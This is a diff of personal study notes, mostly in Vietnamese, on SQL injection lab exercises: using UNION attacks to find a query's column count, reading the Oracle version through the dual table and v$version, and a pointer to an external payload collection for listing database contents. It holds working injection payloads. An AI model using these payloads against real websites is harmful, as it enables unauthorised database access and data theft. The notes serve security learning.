@@ -1,17 +1,29 @@
-( LƯU Ý :  có thể THAY 'abc'  -> null NẾU GẶP server error)
+____________________________________________________________
+|  LƯU Ý :                                                 |  
+|  + có thể THAY 'abc'  -> null NẾU GẶP server error       |
+|  + phải cẩn trọng với các mẫu viết hoa của các câu lệnh  |
+|__________________________________________________________|
 
-Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+Lab: SQL injection UNION attack, determining the number of columns returned by the query ( non - Orancle )
   target: tìm đc số cột của bảng trên web
-' UNION SELECT NULL, NULL ,NULL --
+    + check số cột    
+      ' UNION SELECT NULL, NULL ,NULL --
 
-Lab: SQL injection attack, querying the database type and version on Oracle
-  target : phải đảm bảo output của payload trùng với số cột của bảng cái mà nằm trên giao diện web (CÁI NÀY BẮT BUỘC PHẢI CÓ FROM NÊN PHẢI DÙNG BẢNG dual )
+
+Lab: SQL injection attack, querying the database type and version ( on - Oracle)
+  target : phải đảm bảo output của payload trùng với số cột của bảng cái mà nằm trên giao diện web 
+  (CÁI NÀY BẮT BUỘC PHẢI CÓ FROM NÊN KHI CHECK CỘT PHẢI DÙNG BẢNG dual )
   payload : 
     + check số cột : 
       ' UNION SELECT 'abc' FROM dual--         
       ' UNION SELECT 'abc','def' FROM dual--
     + exploit :
-      ' UNION SELECT banner FROM v$version --
+      ' UNION SELECT 'abc',banner FROM v$version --
+
+Lab: SQL injection attack, listing the database contents on Oracle
+  target : lấy data từ sql của web
+    + explot : < trong payloads all the things>
 
 
 Lab: SQL injection attack, listing the database contents on non-Oracle databases
